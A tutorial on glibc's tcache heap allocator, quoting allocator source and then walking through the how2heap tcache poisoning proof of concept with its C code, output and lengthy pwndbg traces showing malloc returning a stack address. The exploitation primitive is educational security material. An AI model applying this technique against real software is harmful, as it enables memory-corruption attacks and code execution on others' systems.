
## tcache makes heap exploitation easy again

### 0x01 Tcache overview

Two new structures were added in tcache, namely tcache_entry and tcache_perthread_struct

```C
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```



There are two important functions, `tcache_get()` and `tcache_put()`:

```C
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

```

These two functions are called at the beginning of [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) and [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051), where `tcache_put` is called when the requested allocation size is no larger than `0x408` and the tcache bin for the given size is not full. The maximum number of chunks in a tcache bin `mp_.tcache_count` is `7`.

```c
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
```



Let's review the source code of `tcache_get()` again

```C
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```
In `tcache_get`, only **tc_idx** is checked. Furthermore, we can think of tcache as a singly linked list similar to fastbin, except its checks are not as complex as fastbin's — it only checks `tcache->entries[tc_idx] = e->next;`

### 0x02 Tcache Usage



- Memory deallocation:

  As we can see, in the initial processing part of the free function, it first checks whether the freed chunk is page-aligned and the release status of the preceding and following heap chunks, then prioritizes placing it into the tcache structure.
  

  ```c
  
  _int_free (mstate av, mchunkptr p, int have_lock)
  {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */
  
    size = chunksize (p);
  
    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
        || __builtin_expect (misaligned_chunk (p), 0))
      malloc_printerr ("free(): invalid pointer");
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */
    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
      malloc_printerr ("free(): invalid size");
  
    check_inuse_chunk(av, p);
  
  #if USE_TCACHE
    {
      size_t tc_idx = csize2tidx (size);
  
      if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (p, tc_idx);
          return;
        }
    }
  #endif
  
  ......
  }
  ```



- Memory allocation:

In the malloc function for memory allocation, there are multiple places where memory chunks are moved into tcache.

(1) First, when the requested memory chunk fits the fastbin size and a free chunk is found in the fastbin, other memory chunks on that fastbin chain are placed into tcache.

(2) Second, when the requested memory chunk fits the smallbin size and a free chunk is found in the smallbin, other memory chunks on that smallbin chain are placed into tcache.

(3) When iterating through the unsorted bin chain, when a chunk of the appropriate size is found, it is not returned directly but instead placed into tcache first, and processing continues.

The code is too long to paste in full, so here is the portion for the fastbin case

```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		      malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
            && (tc_victim = *fb) != NULL)
            {
              if (SINGLE_THREAD_P)
               *fb = tc_victim->fd;
              else
              {
                REMOVE_FB (fb, pp, tc_victim);
                if (__glibc_unlikely (tc_victim == NULL))
                  break;
              }
              tcache_put (tc_victim, tc_idx);
            }
        }
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
    }
```



 

- tcache retrieval: At the beginning of the memory allocation process, it first checks whether a chunk of the requested size exists in tcache. If it exists, it is directly taken from tcache; otherwise, _int_malloc is used for allocation.

- When iterating through unsorted bin memory chunks, if the maximum number of chunks to be placed in unsorted bin is reached, it returns immediately. The default is 0, meaning there is no upper limit.

  ```c
  #if USE_TCACHE
        /* If we've processed as many chunks as we're allowed while
  	 filling the cache, return one of the cached ones.  */
        ++tcache_unsorted_count;
        if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```

- After iterating through unsorted bin memory chunks, if tcache chunks were previously placed, one is taken out and returned.

  ```c
  #if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        if (return_cached)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```



### 0x03 Pwn Tcache

#### tcache poisoning

By overwriting the next pointer in tcache, you can achieve malloc to any address without needing to forge any chunk structure.

Let's use the [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) example from how2heap

Let's look at the source code

```C
glibc_2.26 [master●] bat tcache_poisoning.c
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: tcache_poisoning.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <stdint.h>
   4   │ 
   5   │ int main()
   6   │ {
   7   │         fprintf(stderr, "This file demonstrates a simple tcache poisoning attack
       │  by tricking malloc into\n"
   8   │                "returning a pointer to an arbitrary location (in this case, the 
       │ stack).\n"
   9   │                "The attack is very similar to fastbin corruption attack.\n\n");
  10   │ 
  11   │         size_t stack_var;
  12   │         fprintf(stderr, "The address we want malloc() to return is %p.\n", (char
       │  *)&stack_var);
  13   │ 
  14   │         fprintf(stderr, "Allocating 1 buffer.\n");
  15   │         intptr_t *a = malloc(128);
  16   │         fprintf(stderr, "malloc(128): %p\n", a);
  17   │         fprintf(stderr, "Freeing the buffer...\n");
  18   │         free(a);
  19   │ 
  20   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
  21   │         fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of t
       │ he data at %p\n"
  22   │                 "to point to the location to control (%p).\n", sizeof(intptr_t),
       │  a, &stack_var);
  23   │         a[0] = (intptr_t)&stack_var;
  24   │ 
  25   │         fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
  26   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
  27   │ 
  28   │         intptr_t *b = malloc(128);
  29   │         fprintf(stderr, "2st malloc(128): %p\n", b);
  30   │         fprintf(stderr, "We got the control\n");
  31   │ 
  32   │         return 0;
  33   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

The execution result is
```bash
glibc_2.26 [master●] ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7fff0d28a0c8.
Allocating 1 buffer.
malloc(128): 0x55f666ee1260
Freeing the buffer...
Now the tcache list has [ 0x55f666ee1260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260
to point to the location to control (0x7fff0d28a0c8).
1st malloc(128): 0x55f666ee1260
Now the tcache list has [ 0x7fff0d28a0c8 ].
2st malloc(128): 0x7fff0d28a0c8
We got the control
```
Let's analyze: the program first allocates a chunk of size 128, then frees it. 128 is within the tcache range, so after freeing, the chunk is placed into tcache. The debugging output is as follows:
```asm
pwndbg> 
0x0000555555554815	18		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
......
 RDI  0x555555756260 ?— 0x0
......
 RIP  0x555555554815 (main+187) ?— call   0x555555554600
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
......
 ? 0x555555554815 <main+187>    call   free@plt <0x555555554600>
        ptr: 0x555555756260 ?— 0x0
......
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
......
 ? 18 	free(a);
......
────────────────────────────────────────[ STACK ]────────────────────────────────────────
......
pwndbg> ni
20		fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x100000000000000
 R8   0x0
 R9   0x7fffffffb78c ?— 0x1c00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555481a (main+192) ?— mov    rax, qword ptr [rip + 0x20083f]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554802 <main+168>    lea    rdi, [rip + 0x2bd]
   0x555555554809 <main+175>    call   fwrite@plt <0x555555554630>
 
   0x55555555480e <main+180>    mov    rax, qword ptr [rbp - 8]
   0x555555554812 <main+184>    mov    rdi, rax
   0x555555554815 <main+187>    call   free@plt <0x555555554600>
 
 ? 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
   0x555555554821 <main+199>    mov    rdx, qword ptr [rbp - 8]
   0x555555554825 <main+203>    lea    rsi, [rip + 0x2b4]
   0x55555555482c <main+210>    mov    rdi, rax
   0x55555555482f <main+213>    mov    eax, 0
   0x555555554834 <main+218>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   15 	intptr_t *a = malloc(128);
   16 	fprintf(stderr, "malloc(128): %p\n", a);
   17 	fprintf(stderr, "Freeing the buffer...\n");
   18 	free(a);
   19 
 ? 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> heapbase
heapbase : 0x555555756000
pwndbg> p *(struct tcache_perthread_struct*)0x555555756010
$3 = {
  counts = "\000\000\000\000\000\000\000\001", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555756260, 0x0 <repeats 56 times>}
}
```
As we can see, at this point the 8th tcache chain already has one chunk, and the same conclusion can be drawn from the `tcache_perthread_struct` structure 

Then modify the next pointer of tcache
```asm
pwndbg> 
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x555555756260
to point to the location to control (0x7fffffffdfa8).
23		a[0] = (intptr_t)&stack_var;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x85
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554867 (main+269) ?— lea    rdx, [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ? 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
   0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   18 	free(a);
   19 
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
 ? 23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> n
25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554872 (main+280) ?— mov    edi, 0x80
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554867 <main+269>    lea    rdx, [rbp - 0x18]
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
 ? 0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
 ? 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260 --> 0x7fffffffdfa8 --> 0x555555554650
```
At this point, the next pointer of the 8th tcache chain has been changed to a stack address. Next, similar to fastbin attack, we only need to perform two `malloc(128)` calls to control the stack space.

First malloc
```asm
pwndbg> n
1st malloc(128): 0x555555756260
26		fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x20
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x6c6c616d20747331 ('1st mall')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2000000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555489a (main+320) ?— mov    rax, qword ptr [rip + 0x2007bf]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
 
 ? 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
   0x5555555548a1 <main+327>    lea    rdx, [rbp - 0x18]
   0x5555555548a5 <main+331>    lea    rsi, [rip + 0x234]
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 ? 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
```

Second malloc — now we can malloc the stack address
```asm
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
pwndbg> ni
0x00005555555548c3	28		intptr_t *b = malloc(128);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x555555756010 ?— 0xff00000000000000
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x555555554650 (_start) ?— xor    ebp, ebp
 RSI  0x555555756048 ?— 0x0
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2c00000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x5555555548c3 (main+361) ?— mov    qword ptr [rbp - 0x10], rax
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
 
   0x5555555548b9 <main+351>    mov    edi, 0x80
   0x5555555548be <main+356>    call   malloc@plt <0x555555554620>
 
 ? 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
   0x5555555548c7 <main+365>    mov    rax, qword ptr [rip + 0x200792] <0x555555755060>
   0x5555555548ce <main+372>    mov    rdx, qword ptr [rbp - 0x10]
   0x5555555548d2 <main+376>    lea    rsi, [rip + 0x2b4]
   0x5555555548d9 <main+383>    mov    rdi, rax
   0x5555555548dc <main+386>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
 ? 28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
   32 	return 0;
   33 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp      0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rax rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│          0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│          0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp      0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│          0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│          0x7fffffffdfd0 ?— 0x0
